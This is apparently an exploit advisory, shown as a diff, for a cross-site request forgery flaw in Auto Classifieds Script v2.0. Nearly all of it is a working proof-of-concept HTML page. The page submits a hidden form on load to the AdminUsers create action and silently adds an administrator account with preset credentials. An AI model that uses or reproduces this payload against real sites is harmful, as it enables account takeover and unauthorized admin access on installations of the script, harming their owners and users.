@@ -1,0 +1,36 @@
+Auto Classifieds Script v2.0 - CSRF Vulnerabilty [Add Admin]
+====================================================================
+
+####################################################################
+.:. Author         : HackXBack
+.:. Contact        : h-b@usa.com
+.:. Home           : http://www.iphobos.com/blog/
+.:. Script         :
+http://www.phpjabbers.com/preview/auto-classifieds-script/
+
+####################################################################
+
+===[ Exploit ]===
+
+Cross Site Request Forgery
+===========================
+
+[Add Admin]
+
+<html>
+<body onload="document.form0.submit();">
+<form method="POST" name="form0" action="
+http://www.site.com/index.php?controller=AdminUsers&action=create">
+<input type="hidden" name="user_create" value="1"/>
+<input type="hidden" name="Full_name" value="Iphobos"/>
+<input type="hidden" name="username" value="Admin"/>
+<input type="hidden" name="password" value="password"/>
+<input type="hidden" name="status" value="T"/>
+<input type="hidden" name="role_id" value="1"/>
+</form>
+
+</body>
+</html>
+
+
+####################################################################
